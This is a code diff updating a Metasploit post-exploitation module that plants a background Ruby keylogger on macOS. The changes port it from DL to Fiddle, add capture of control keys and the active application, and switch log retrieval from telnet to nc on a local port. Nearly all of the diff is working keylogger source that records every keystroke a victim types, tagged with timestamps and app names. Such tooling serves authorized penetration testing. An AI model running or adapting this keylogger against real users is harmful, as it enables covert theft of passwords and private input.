@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -50,7 +50,7 @@ class MetasploitModule < Msf::Post
           [ true, 'The time between transferring log chunks.', 10 ]
         ),
         OptPort.new('LOGPORT',
-          [ false, 'Local port opened for momentarily for log transfer', 22899 ]
+          [ false, 'Local port opened momentarily for log transfer', 22899 ]
         )
       ]
     )
@@ -62,9 +62,9 @@ class MetasploitModule < Msf::Post
       :duration => datastore['DURATION'].to_i,
       :port => self.port
     }
-    cmd = ['ruby', '-e', ruby_code(opts)]
 
-    rpid = cmd_exec(cmd.shelljoin, nil, 10)
+    cmd = "OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES ruby -e #{ruby_code(opts).shellescape}"
+    rpid = cmd_exec(cmd, nil, 10)
 
     if rpid =~ /^\d+/
       print_status "Ruby process executing with pid #{rpid.to_i}"
@@ -100,7 +100,8 @@ class MetasploitModule < Msf::Post
           print_status "Sending USR1 signal to open TCP port..."
           cmd_exec("kill -USR1 #{self.pid}")
           print_status "Dumping logs..."
-          log = cmd_exec("telnet localhost #{self.port}")
+          # Telnet is not installed in MacOS 10.13+
+          log = cmd_exec("nc localhost #{self.port}")
           log_a = log.scan(/^\[.+?\] \[.+?\] .*$/)
           log = log_a.join("\n")+"\n"
           print_status "#{log_a.size} keystrokes captured"
@@ -144,49 +145,13 @@ class MetasploitModule < Msf::Post
 # Kick off a child process and let parent die
 child_pid = fork do
   require 'thread'
-  require 'dl'
-  require 'dl/import'
-
+  require 'fiddle'
+  require 'fiddle/import'
 
   options = {
     :duration => #{opts[:duration]},
     :port => #{opts[:port]}
   }
-
-
-  #### Patches to DL (for compatibility between 1.8->1.9)
-
-  Importer = if defined?(DL::Importer) then DL::Importer else DL::Importable end
-
-  def ruby_1_9_or_higher?
-    RUBY_VERSION.to_f >= 1.9
-  end
-
-  def malloc(size)
-    if ruby_1_9_or_higher?
-      DL::CPtr.malloc(size)
-    else
-      DL::malloc(size)
-    end
-  end
-
-  # the old Ruby Importer defaults methods to downcase every import
-  # This is annoying, so we'll patch with method_missing
-  if not ruby_1_9_or_higher?
-    module DL
-      module Importable
-        def method_missing(meth, *args, &block)
-          str = meth.to_s
-          lower = str[0,1].downcase + str[1..-1]
-          if self.respond_to? lower, true
-            self.send lower, *args
-          else
-            super
-          end
-        end
-      end
-    end
-  end
 
   #### 1-way IPC ####
 
@@ -200,7 +165,7 @@ child_pid = fork do
         server = TCPServer.new(options[:port])
         client = server.accept
         log_semaphore.synchronize do
-          client.puts(log+"\n\r")
+          client.puts(log+"\n")
           log = ''
         end
         client.close
@@ -217,8 +182,8 @@ child_pid = fork do
   MAX_APP_NAME = 80
 
   module Carbon
-    extend Importer
-    dlload 'Carbon.framework/Carbon'
+    extend Fiddle::Importer
+    dlload '/System/Library/Frameworks/Carbon.framework/Carbon'
     extern 'unsigned long CopyProcessName(const ProcessSerialNumber *, void *)'
     extern 'void GetFrontProcess(ProcessSerialNumber *)'
     extern 'void GetKeys(void *)'
@@ -228,16 +193,17 @@ child_pid = fork do
     extern 'int CFStringGetLength(void *)'
   end
 
-  psn = malloc(16)
-  name = malloc(16)
-  name_cstr = malloc(MAX_APP_NAME)
-  keymap = malloc(16)
-  state = malloc(8)
+  psn = Fiddle::Pointer.malloc(16)
+  name = Fiddle::Pointer.malloc(16)
+  name_cstr = Fiddle::Pointer.malloc(MAX_APP_NAME)
+  keymap = Fiddle::Pointer.malloc(16)
+  state = Fiddle::Pointer.malloc(8)
 
   #### Actual Keylogger code
 
   itv_start = Time.now.to_i
   prev_down = Hash.new(false)
+  lastWindow = ""
 
   while (true) do
     Carbon.GetFrontProcess(psn.ref)
@@ -251,29 +217,65 @@ child_pid = fork do
     bytes = keymap.to_str
     cap_flag = false
     ascii = 0
+    ctrlchar = ""
 
     (0...128).each do |k|
       # pulled from apple's developer docs for Carbon#KeyMap/GetKeys
       if ((bytes[k>>3].ord >> (k&7)) & 1 > 0)
         if not prev_down[k]
-          kchr = Carbon.GetScriptVariable(SM_KCHR_CACHE, SM_CURRENT_SCRIPT)
-          curr_ascii = Carbon.KeyTranslate(kchr, k, state)
-          curr_ascii = curr_ascii >> 16 if curr_ascii < 1
-          prev_down[k] = true
-          if curr_ascii == 0
-            cap_flag = true
-          else
-            ascii = curr_ascii
+          case k
+            when 36
+              ctrlchar = "[enter]"
+            when 48
+              ctrlchar = "[tab]"
+            when 49
+              ctrlchar = " "
+            when 51
+              ctrlchar = "[delete]"
+            when 53
+              ctrlchar = "[esc]"
+            when 55
+              ctrlchar = "[cmd]"
+            when 56
+              ctrlchar = "[shift]"
+            when 57
+              ctrlchar = "[caps]"
+            when 58
+              ctrlchar = "[option]"
+            when 59
+              ctrlchar = "[ctrl]"
+            when 63
+              ctrlchar = "[fn]"
+            else
+              ctrlchar = ""
+          end
+          if ctrlchar == "" and ascii == 0
+            kchr = Carbon.GetScriptVariable(SM_KCHR_CACHE, SM_CURRENT_SCRIPT)
+            curr_ascii = Carbon.KeyTranslate(kchr, k, state)
+            curr_ascii = curr_ascii >> 16 if curr_ascii < 1
+            prev_down[k] = true
+            if curr_ascii == 0
+              cap_flag = true
+            else
+              ascii = curr_ascii
+            end
+          elsif ctrlchar != ""
+            prev_down[k] = true
           end
         end
       else
-      	prev_down[k] = false
+        prev_down[k] = false
       end
     end
-
-    if ascii != 0 # cmd/modifier key. not sure how to look this up. assume shift.
+    if ascii != 0 or ctrlchar != ""
       log_semaphore.synchronize do
-        if ascii > 32 and ascii < 127
+        if app_name != lastWindow
+          log = log << "[\#{Time.now.to_i}] [\#{app_name}]\n"
+          lastWindow = app_name
+        end
+        if ctrlchar != ""
+          log = log << "[\#{Time.now.to_i}] [\#{app_name}] \#{ctrlchar}\n"
+        elsif ascii > 32 and ascii < 127
           c = if cap_flag then ascii.chr.upcase else ascii.chr end
           log = log << "[\#{Time.now.to_i}] [\#{app_name}] \#{c}\n"
         else
@@ -293,4 +295,3 @@ Process.detach(child_pid)
 EOS
   end
 end
-
